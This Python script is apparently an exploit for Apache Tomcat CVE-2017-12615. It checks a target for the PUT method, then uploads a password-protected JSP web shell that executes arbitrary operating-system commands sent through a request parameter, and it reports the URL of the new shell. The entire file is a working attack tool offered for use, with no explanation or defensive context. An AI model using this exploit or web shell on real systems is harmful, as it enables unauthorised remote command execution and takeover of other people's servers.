# -*- coding: utf-8 -*-
#author:wsg00d
#date:2017/10/10


import requests
import sys
import random

body='''
<%
    if("023".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b,0,a));
        }
        out.print("</pre>");
    }
%>'''

if len(sys.argv)<2:
    print "python tomcat-cve-2017-12615.py http://127.0.0.1:8080/"
    sys.exit()

url=sys.argv[1]

r=requests.options(url=url+'/123')
header=r.headers
#print header

if 'PUT' in header['Allow']:
    filename='/'+str(random.randint(666,666666))+'.jsp/'
    #print filename
    r=requests.put(url=url+filename,data=body)
    #print r.status_code
    if r.status_code==201:
        print 'create shell success: '+url+filename[:-1]
    else:
        print 'error'
